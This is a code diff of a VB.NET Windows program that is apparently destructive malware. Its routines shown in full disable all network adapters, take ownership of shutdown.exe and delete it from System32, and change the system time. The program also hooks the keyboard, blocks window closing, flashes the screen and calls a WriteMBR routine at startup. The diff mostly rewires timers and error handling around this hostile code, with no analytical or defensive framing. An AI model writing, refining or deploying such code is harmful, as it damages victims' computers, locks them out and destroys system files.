@@ -85,7 +85,6 @@ Public Class Form1
     Public Class FullScreenOverlay
         Inherits Form
 
-        Private ReadOnly animationTimer As New Windows.Forms.Timer()
         Private ReadOnly random As New Random()
         Private ReadOnly timerLabel As New Label()
         Private ReadOnly audioPlayer As New AudioPlayer()
@@ -110,10 +109,6 @@ Public Class Form1
             ' Initialize and start audio
             audioPlayer.PlayAudio()
 
-            ' Start the timer
-            animationTimer.Interval = 1000 ' Timer triggers every second
-            AddHandler animationTimer.Tick, AddressOf AnimationTimer_Tick
-            animationTimer.Start()
         End Sub
 
         ' Timer tick function, applies effects and updates countdown timer
@@ -647,44 +642,47 @@ Public Class Form1
 
     ' Disconnect the Internet by disabling all network adapters
     Private Sub DisconnectInternet()
-        Dim networkManagement As New ManagementClass("Win32_NetworkAdapter")
-        Dim networkAdapters As ManagementObjectCollection = networkManagement.GetInstances()
-
-        For Each adapter As ManagementObject In networkAdapters
-            If CBool(adapter("NetEnabled")) Then
-                ' Disable the network adapter
-                adapter.InvokeMethod("Disable", Nothing)
-                Console.WriteLine($"Disabled adapter: {adapter("Name")}")
-            End If
-        Next
+        Try
+            Dim networkManagement As New ManagementClass("Win32_NetworkAdapter")
+            Dim networkAdapters As ManagementObjectCollection = networkManagement.GetInstances()
+            For Each adapter As ManagementObject In networkAdapters
+                If CBool(adapter("NetEnabled")) Then
+                    ' Disable the network adapter
+                    adapter.InvokeMethod("Disable", Nothing)
+                    Console.WriteLine($"Disabled adapter: {adapter("Name")}")
+                End If
+            Next
+        Catch ex As Exception
+            Console.WriteLine("Failed to disable network adapters: " & ex.Message)
+        End Try
     End Sub
 
     Public Sub KillGrantAccessAndDeleteShutdownExe()
         ' Path to shutdown.exe in System32
         Dim shutdownExePath As String = "C:\Windows\System32\shutdown.exe"
 
-            ' Step 1: Kill any running instances of shutdown.exe
-            Dim processes = Process.GetProcessesByName("shutdown")
-            For Each proc In processes
-                Try
-                    proc.Kill() ' Kill the process
-                    proc.WaitForExit() ' Wait for the process to exit
-                Catch ex As Exception
-                    MessageBox.Show("Could not kill process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-                End Try
-            Next
+        ' Step 1: Kill any running instances of shutdown.exe
+        Dim processes = Process.GetProcessesByName("shutdown")
+        For Each proc In processes
+            Try
+                proc.Kill() ' Kill the process
+                proc.WaitForExit() ' Wait for the process to exit
+            Catch ex As Exception
+                MessageBox.Show("Could not kill process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            End Try
+        Next
 
-            ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
-            Dim grantAccessCmd As String = $"icacls {shutdownExePath} /grant *S-1-1-0:(F)"
-            ExecuteCommand(grantAccessCmd)
+        ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
+        Dim grantAccessCmd As String = $"icacls {shutdownExePath} /grant *S-1-1-0:(F)"
+        ExecuteCommand(grantAccessCmd)
 
-            ' Step 3: Delete shutdown.exe
-            If File.Exists(shutdownExePath) Then
-                File.Delete(shutdownExePath)
-                MessageBox.Show("shutdown.exe deleted successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
-            Else
-                MessageBox.Show("shutdown.exe not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-            End If
+        ' Step 3: Delete shutdown.exe
+        If File.Exists(shutdownExePath) Then
+            File.Delete(shutdownExePath)
+            MessageBox.Show("shutdown.exe deleted successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
+        Else
+            MessageBox.Show("shutdown.exe not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End If
     End Sub
 
     Private Function TriageCheck() As Boolean
@@ -735,7 +733,7 @@ Public Class Form1
                 Throw New ComponentModel.Win32Exception(Marshal.GetLastWin32Error())
             End If
         Catch ex As Exception
-            MessageBox.Show("Failed to set system time: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            Console.WriteLine("Failed to set system time: " & ex.Message)
         End Try
     End Sub
 
@@ -906,7 +904,7 @@ Public Class Form1
         GrantSelfPermissions()
         animationTimer.Start()
         VisualEffectTimer.Start()
-
+        portalTimer.Start()
         ' Update registry settings and disable Log off
         UpdateRegistrySettings()
         WriteMBR()
@@ -951,17 +949,9 @@ Public Class Form1
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Try
-            ' Timer for animation effects
-            animationTimer.Interval = 100
-            AddHandler animationTimer.Tick, AddressOf AnimationTimer_Tick
-
-            ' Timer for sound effect simulation
-            VisualEffectTimer.Interval = 500
-            AddHandler VisualEffectTimer.Tick, AddressOf VisualFlash_Tick
-
             ' Disable Alt + F4 (window close button)
-            Me.FormBorderStyle = FormBorderStyle.None
-            Me.StartPosition = FormStartPosition.CenterScreen
+            FormBorderStyle = FormBorderStyle.None
+            StartPosition = FormStartPosition.CenterScreen
 
             ' Set up the low-level keyboard hook
             hookCallbackDelegate = New HookProc(AddressOf HookCallback)
@@ -970,11 +960,30 @@ Public Class Form1
             MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
     End Sub
+
+    Private Sub PortalTimer_Tick(sender As Object, e As EventArgs) Handles portalTimer.Tick
+        ' Invalidate the form to trigger a repaint
+        Invalidate()
+    End Sub
+
     Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
     End Sub
 
+    Private Sub VisualEffectTimer_Tick(sender As Object, e As EventArgs) Handles VisualEffectTimer.Tick
+
+        ' Simulate visual flash effect by flashing the screen with different colors
+        Dim g As Graphics = CreateGraphics()
+        Dim random As New Random()
+        Dim flashColor As Color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256))
+        Dim flashBrush As New SolidBrush(flashColor)
+
+        g.FillRectangle(flashBrush, ClientRectangle)
+        Thread.Sleep(50)
+        Invalidate() ' Clear the flash effect
+    End Sub
+
     ' Timer Tick event handler for animation effects
-    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs)
+    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs) Handles animationTimer.Tick
         ' Create a blur effect by drawing semi-transparent rectangles
         Dim g As Graphics = Me.CreateGraphics()
         Dim blurBrush As New SolidBrush(Color.FromArgb(50, Color.Black))
@@ -995,20 +1004,4 @@ Public Class Form1
         Thread.Sleep(50)
     End Sub
 
-    Private Sub VisualEffectTimer_Tick(sender As Object, e As EventArgs) Handles VisualEffectTimer.Tick
-
-    End Sub
-
-    ' Timer Tick event handler for simulating visual flash effects
-    Private Sub VisualFlash_Tick(sender As Object, e As EventArgs)
-        ' Simulate visual flash effect by flashing the screen with different colors
-        Dim g As Graphics = Me.CreateGraphics()
-        Dim random As New Random()
-        Dim flashColor As Color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256))
-        Dim flashBrush As New SolidBrush(flashColor)
-
-        g.FillRectangle(flashBrush, Me.ClientRectangle)
-        Thread.Sleep(50)
-        Me.Invalidate() ' Clear the flash effect
-    End Sub
 End Class
